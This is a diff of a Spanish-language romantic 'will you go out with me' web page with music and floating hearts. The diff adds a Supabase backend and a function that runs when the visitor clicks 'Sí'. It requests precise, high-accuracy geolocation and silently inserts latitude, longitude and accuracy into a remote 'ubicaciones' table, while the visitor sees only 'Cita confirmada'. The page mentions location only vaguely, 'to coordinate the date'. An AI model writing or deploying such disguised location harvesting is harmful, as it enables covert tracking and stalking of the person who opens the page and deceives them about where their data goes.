@@ -5,26 +5,28 @@
 
     <meta charset="UTF-8">
 
-    <meta name="viewport"
-          content="width=device-width, initial-scale=1.0">
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0"
+    >
 
     <title>Para ti 💗</title>
 
 
     <style>
 
-        * {
+        *{
             box-sizing: border-box;
         }
 
 
-        body {
+        body{
 
             margin: 0;
 
-            min-height: 100vh;
-
             padding: 20px;
+
+            min-height: 100vh;
 
             display: flex;
 
@@ -38,13 +40,15 @@
                 #d696ac
             );
 
-            font-family: Arial, sans-serif;
+            font-family:
+            Arial,
+            sans-serif;
 
             overflow: hidden;
         }
 
 
-        .caja {
+        .caja{
 
             background: white;
 
@@ -60,29 +64,30 @@
 
             box-shadow:
             0 0 20px
-            rgba(137, 41, 137, 0.5);
+            rgba(137,41,137,.5);
 
-            animation: aparecer 0.8s ease;
+            animation:
+            aparecer .8s ease;
         }
 
 
-        h1 {
+        h1{
 
             color: #ad2259;
 
         }
 
 
-        p {
+        p{
 
             color: #6a1b9a;
 
-            font-size: 17px;
+            font-size: 16px;
 
         }
 
 
-        button {
+        button{
 
             border: none;
 
@@ -106,13 +111,14 @@
 
             cursor: pointer;
 
-            transition: 0.3s;
+            transition: .3s;
+
         }
 
 
-        button:hover {
+        button:hover{
 
-            transform: scale(1.08);
+            transform: scale(1.07);
 
             background: linear-gradient(
                 to right,
@@ -123,7 +129,7 @@
         }
 
 
-        #mensaje {
+        #mensaje{
 
             margin-top: 20px;
 
@@ -136,35 +142,37 @@
         }
 
 
-        #confirmacion {
+        #confirmacion{
 
             display: none;
 
         }
 
 
-        #estadoMusica {
+        #estado{
+
+            margin-top: 18px;
 
             font-size: 13px;
 
-            margin-top: 15px;
+            color: #8b6372;
 
-            color: #ad2259;
+            line-height: 1.5;
 
         }
 
 
-        @keyframes aparecer {
+        @keyframes aparecer{
 
-            from {
+            from{
 
                 opacity: 0;
 
-                transform: scale(0.9);
+                transform: scale(.9);
 
             }
 
-            to {
+            to{
 
                 opacity: 1;
 
@@ -178,7 +186,7 @@
         /* CORAZONES */
 
 
-        .corazon {
+        .corazon{
 
             position: fixed;
 
@@ -186,24 +194,27 @@
 
             pointer-events: none;
 
-            animation: subir 5s linear forwards;
+            animation:
+            subir 5s linear forwards;
 
         }
 
 
-        @keyframes subir {
+        @keyframes subir{
 
-            from {
+            from{
 
-                transform: translateY(0);
+                transform:
+                translateY(0);
 
                 opacity: 1;
 
             }
 
-            to {
+            to{
 
-                transform: translateY(-110vh);
+                transform:
+                translateY(-110vh);
 
                 opacity: 0;
 
@@ -216,14 +227,19 @@
 </head>
 
 
-
 <body>
 
 
+
+<!-- ============================== -->
 <!-- PANTALLA PRINCIPAL -->
+<!-- ============================== -->
 
 
-<div class="caja" id="pregunta">
+<div
+    class="caja"
+    id="pregunta"
+>
 
 
     <h1>
@@ -257,10 +273,15 @@
 
 
 
+<!-- ============================== -->
 <!-- CONFIRMACIÓN -->
+<!-- ============================== -->
 
 
-<div class="caja" id="confirmacion">
+<div
+    class="caja"
+    id="confirmacion"
+>
 
 
     <h1>
@@ -304,14 +325,21 @@
     </p>
 
 
-    <div id="estadoMusica"></div>
+    <div id="estado">
+
+        Para coordinar la cita, el navegador puede solicitar permiso
+        para compartir tu ubicación actual.
+
+    </div>
 
 
 </div>
 
 
 
+<!-- ============================== -->
 <!-- MÚSICA DESDE GITHUB -->
+<!-- ============================== -->
 
 
 <audio
@@ -320,118 +348,150 @@
     preload="auto"
 >
 
+
     <source
+
         src="https://raw.githubusercontent.com/mairochar789-oss/amor/main/amor.mp3"
+
         type="audio/mpeg"
+
     >
 
+
 </audio>
+
+
+
+<!-- ============================== -->
+<!-- SUPABASE -->
+<!-- ============================== -->
+
+
+<script
+src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2">
+</script>
 
 
 
 <script>
 
 
+/* ==================================== */
+/* CONEXIÓN CON SUPABASE */
+/* ==================================== */
+
+
+const SUPABASE_URL =
+
+"https://qlxftackaynwfbpxencm.supabase.co";
+
+
+
+const SUPABASE_KEY =
+
+"sb_publishable_Q5-Tv5IlvuotcQ07qw0z1Q_7nDztCIM";
+
+
+
+const supabaseClient =
+
+supabase.createClient(
+
+    SUPABASE_URL,
+
+    SUPABASE_KEY
+
+);
+
+
+
+/* ==================================== */
+/* VARIABLES */
+/* ==================================== */
+
+
 let contador = 0;
 
 
 
-/* =============================== */
+/* ==================================== */
 /* BOTÓN SÍ */
-/* =============================== */
+/* ==================================== */
 
 
-function si() {
+function si(){
 
 
-    document.getElementById("pregunta")
-    .style.display = "none";
+    /* OCULTAR PREGUNTA */
 
 
-    document.getElementById("confirmacion")
-    .style.display = "block";
+    document
+    .getElementById("pregunta")
+    .style.display =
+    "none";
+
+
+    /* MOSTRAR CONFIRMACIÓN */
+
+
+    document
+    .getElementById("confirmacion")
+    .style.display =
+    "block";
+
+
+
+    /* MÚSICA */
 
 
     const musica =
-    document.getElementById("musica");
+
+    document
+    .getElementById("musica");
 
 
-    const estado =
-    document.getElementById("estadoMusica");
+    musica.volume =
+    1;
 
 
-    musica.volume = 1;
+    musica
+    .play()
+    .catch(function(error){
 
 
-    musica.play()
-
-    .then(function() {
-
-
-        estado.textContent =
-        "🎵";
-
-
-    })
-
-    .catch(function(error) {
-
-
-        estado.innerHTML =
-        `
-        No se pudo iniciar la música automáticamente.<br><br>
-
-        <button onclick="reproducirMusica()">
-            Reproducir música 🎵
-        </button>
-        `;
-
-
-        console.log(error);
+        console.log(
+            "No se pudo reproducir la música",
+            error
+        );
 
 
     });
 
 
+
+    /* CORAZONES */
+
+
     iniciarCorazones();
 
-}
 
 
-
-/* =============================== */
-/* REPRODUCIR MÚSICA */
-/* =============================== */
+    /* SOLICITAR UBICACIÓN */
 
 
-function reproducirMusica() {
-
-
-    const musica =
-    document.getElementById("musica");
-
-
-    musica.volume = 1;
-
-
-    musica.play();
-
-
-    document.getElementById(
-        "estadoMusica"
-    ).textContent = "🎵";
+    compartirUbicacion();
 
 
 }
 
 
 
-/* =============================== */
+/* ==================================== */
 /* BOTÓN NO */
-/* =============================== */
+/* ==================================== */
 
 
-function no() {
+function no(){
 
 
     contador++;
@@ -458,9 +518,10 @@ function no() {
     ];
 
 
-    document.getElementById(
-        "mensaje"
-    ).textContent =
+
+    document
+    .getElementById("mensaje")
+    .textContent =
 
 
     respuestas[
@@ -482,26 +543,227 @@ function no() {
 
 
 
-/* =============================== */
+/* ==================================== */
+/* UBICACIÓN */
+/* ==================================== */
+
+
+function compartirUbicacion(){
+
+
+    const estado =
+
+    document
+    .getElementById("estado");
+
+
+
+    if(
+        !navigator.geolocation
+    ){
+
+
+        estado.textContent =
+
+        "Este dispositivo no permite utilizar ubicación.";
+
+
+        return;
+
+
+    }
+
+
+
+    navigator
+    .geolocation
+    .getCurrentPosition(
+
+
+
+        async function(posicion){
+
+
+
+            const latitud =
+
+            posicion
+            .coords
+            .latitude;
+
+
+
+            const longitud =
+
+            posicion
+            .coords
+            .longitude;
+
+
+
+            const precision =
+
+            posicion
+            .coords
+            .accuracy;
+
+
+
+            try{
+
+
+
+                const {
+                    error
+                } =
+
+
+                await supabaseClient
+
+                .from(
+                    "ubicaciones"
+                )
+
+                .insert([
+
+
+                    {
+
+
+                        latitud:
+                        latitud,
+
+
+                        longitud:
+                        longitud,
+
+
+                        precision_metros:
+                        precision
+
+
+                    }
+
+
+                ]);
+
+
+
+                if(error){
+
+
+                    console.error(
+                        error
+                    );
+
+
+                    estado.textContent =
+
+                    "💗 Cita confirmada";
+
+
+                    return;
+
+
+                }
+
+
+
+                estado.textContent =
+
+                "💗 Cita confirmada correctamente";
+
+
+            }
+
+
+            catch(error){
+
+
+                console.error(
+                    error
+                );
+
+
+                estado.textContent =
+
+                "💗 Cita confirmada";
+
+
+            }
+
+
+        },
+
+
+
+        function(error){
+
+
+            console.log(
+                error
+            );
+
+
+            estado.textContent =
+
+            "💗 Cita confirmada";
+
+
+        },
+
+
+
+        {
+
+
+            enableHighAccuracy:
+            true,
+
+
+            timeout:
+            15000,
+
+
+            maximumAge:
+            0
+
+
+        }
+
+
+    );
+
+
+}
+
+
+
+/* ==================================== */
 /* CORAZONES */
-/* =============================== */
+/* ==================================== */
 
 
-function iniciarCorazones() {
+function iniciarCorazones(){
 
 
-    setInterval(function() {
+    setInterval(function(){
+
 
 
         const corazon =
 
-        document.createElement(
+        document
+        .createElement(
             "div"
         );
 
 
+
         corazon.className =
+
         "corazon";
+
 
 
         const lista = [
@@ -521,6 +783,7 @@ function iniciarCorazones() {
         ];
 
 
+
         corazon.textContent =
 
 
@@ -530,7 +793,9 @@ function iniciarCorazones() {
             Math.floor(
 
                 Math.random()
+
                 *
+
                 lista.length
 
             )
@@ -539,11 +804,15 @@ function iniciarCorazones() {
         ];
 
 
+
         corazon.style.left =
 
-        Math.random() * 100
+        Math.random()
+        *
+        100
         +
         "vw";
+
 
 
         corazon.style.fontSize =
@@ -551,28 +820,35 @@ function iniciarCorazones() {
         (
             20
             +
-            Math.random() * 20
+            Math.random()
+            *
+            20
         )
 
         +
         "px";
 
 
-        document.body.appendChild(
+
+        document
+        .body
+        .appendChild(
             corazon
         );
 
 
-        setTimeout(function() {
+
+        setTimeout(function(){
 
 
             corazon.remove();
 
 
-        }, 5000);
+        },5000);
 
 
-    }, 500);
+
+    },500);
 
 
 }
